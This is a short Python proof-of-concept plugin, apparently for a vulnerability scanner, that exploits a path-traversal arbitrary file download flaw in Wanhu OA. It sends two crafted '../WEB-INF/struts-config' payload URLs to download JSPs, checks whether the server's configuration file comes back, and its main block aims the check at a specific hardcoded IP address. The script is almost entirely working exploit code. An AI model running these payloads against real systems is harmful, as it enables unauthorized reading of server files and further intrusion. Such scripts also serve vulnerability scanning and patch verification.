#!/usr/bin/env python
# -*- coding: utf-8 -*-
#POC Name  : 万户OA多处无限制任意文件下载
#Author    : 这个程序员不太冷
#Referer   : http://www.wooyun.org/bugs/wooyun-2014-065752


import re


def assign(service,arg):
    if service == "whezeip":
        return True,arg

def audit(arg):
    payloads=["defaultroot/netdisk/download_netdisk.jsp?path=1&fileName=../../WEB-INF/struts-config&fileExtName=xml&fileSaveName=file","defaultroot/information_manager/informationmanager_download.jsp?path=..&FileName=WEB-INF/struts-config.xml&name=file"]
    for payload in payloads:
        target=arg+payload
        code, head, res, errcode, _ = curl.curl2(target)
        if code==200 and '<struts-config>' in res and 'filename=\"file\"' in head:
            security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('whezeip','http://60.172.210.251:7001/')[1])
